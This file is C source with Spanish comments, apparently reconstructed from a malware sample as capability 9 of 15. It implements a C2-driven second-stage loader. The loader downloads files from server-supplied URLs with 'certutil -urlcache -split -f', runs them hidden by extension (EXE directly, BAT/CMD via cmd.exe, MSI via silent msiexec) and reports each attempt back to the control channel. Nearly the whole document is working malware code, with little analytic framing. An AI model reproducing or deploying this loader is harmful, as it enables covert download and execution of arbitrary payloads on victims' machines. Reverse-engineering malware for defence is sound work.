/* ============================================================
 * Capacidad 09/15 — Descarga y ejecución secundaria
 * Función C : ProcessDownloadTasks
 * Dirección : 0x18001c54f   · Nodo N4   · Confianza: Alta
 * ------------------------------------------------------------
 * Procesa una lista de tareas de descarga entregada por el C2 (+0x00 de
 * la configuración). Descarga con certutil y ejecuta según extensión:
 * EXE directo, BAT/CMD mediante cmd.exe y MSI mediante msiexec /i /qn
 * /norestart. Permite la entrega de una segunda etapa.
 * ============================================================
 */

#include "00_tipos_comunes.h"

typedef enum {
    EXT_UNKNOWN = 0,
    EXT_EXE,
    EXT_BAT,
    EXT_CMD,
    EXT_MSI
} FileExtension;

/* Detecta la extensión a partir de la ruta local. */
static FileExtension DetectExtension(const wchar_t *path)
{
    if (path == NULL)
        return EXT_UNKNOWN;
    const wchar_t *dot = wcsrchr(path, L'.');
    if (dot == NULL)
        return EXT_UNKNOWN;

    if (_wcsicmp(dot, L".exe") == 0) return EXT_EXE;
    if (_wcsicmp(dot, L".bat") == 0) return EXT_BAT;
    if (_wcsicmp(dot, L".cmd") == 0) return EXT_CMD;
    if (_wcsicmp(dot, L".msi") == 0) return EXT_MSI;
    return EXT_UNKNOWN;
}

/* Ejecuta una línea de comando sin mostrar ventana. */
static bool RunHiddenCommand(const wchar_t *command_line)
{
    STARTUPINFOW        si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    wchar_t cmd[MAX_PATH * 2];
    wcsncpy_s(cmd, _countof(cmd), command_line, _TRUNCATE);

    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return false;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

/* Descarga con certutil: certutil -urlcache -split -f <url> <ruta>. */
static bool DownloadWithCertutil(const wchar_t *url, const wchar_t *local_path)
{
    wchar_t cmd[MAX_PATH * 2];
    _snwprintf_s(cmd, _countof(cmd), _TRUNCATE,
                 L"certutil -urlcache -split -f \"%s\" \"%s\"", url, local_path);
    return RunHiddenCommand(cmd);
}

static bool RunViaShellExecuteOrCreateProcess(const wchar_t *path, const wchar_t *args)
{
    wchar_t cmd[MAX_PATH * 2];
    _snwprintf_s(cmd, _countof(cmd), _TRUNCATE,
                 L"\"%s\" %s", path, (args != NULL) ? args : L"");
    return RunHiddenCommand(cmd);
}

static bool RunViaCmd(const wchar_t *path, const wchar_t *args)
{
    wchar_t cmd[MAX_PATH * 2];
    _snwprintf_s(cmd, _countof(cmd), _TRUNCATE,
                 L"cmd.exe /c \"%s\" %s", path, (args != NULL) ? args : L"");
    return RunHiddenCommand(cmd);
}

static bool RunViaMsiexec(const wchar_t *path)
{
    wchar_t cmd[MAX_PATH * 2];
    _snwprintf_s(cmd, _countof(cmd), _TRUNCATE,
                 L"msiexec /i \"%s\" /qn /norestart", path);
    return RunHiddenCommand(cmd);
}

/* Registra el intento de la tarea en el canal interno de resultados. */
static void RecordTaskAttempt(const DownloadTask *task, Channel *channel)
{
    if (task == NULL || channel == NULL)
        return;

    ByteBuffer payload;
    payload.len  = sizeof(DownloadTask);
    payload.cap  = sizeof(DownloadTask);
    payload.data = (uint8_t *)HeapAlloc(GetProcessHeap(), 0, payload.len);
    if (payload.data == NULL)
        return;
    CopyMemory(payload.data, task, payload.len);

    QueueTypedMessage(channel, MSG_APP_OR_REGISTRY, payload);
}

/* ------------------------------------------------------------------
 * 0x18001c54f — procesa las tareas de descarga [condicionado].
 * ------------------------------------------------------------------ */
void ProcessDownloadTasks(const TaskList *tasks, Channel *channel)
{
    if (tasks == NULL || tasks->items == NULL)
        return;

    for (size_t i = 0; i < tasks->count; i++) {
        const DownloadTask *task = &tasks->items[i];

        /* 1) Descarga: certutil -urlcache -split -f <url> <ruta_local>. */
        DownloadWithCertutil(task->url, task->local_path);

        /* 2) Ejecución según extensión. */
        switch (DetectExtension(task->local_path)) {
        case EXT_EXE:
            RunViaShellExecuteOrCreateProcess(task->local_path, task->args);
            break;
        case EXT_BAT:
        case EXT_CMD:
            RunViaCmd(task->local_path, task->args);
            break;
        case EXT_MSI:
            RunViaMsiexec(task->local_path);   /* /i /qn /norestart */
            break;
        default:
            break;
        }
        RecordTaskAttempt(task, channel);   /* resultado al canal interno */
    }
}
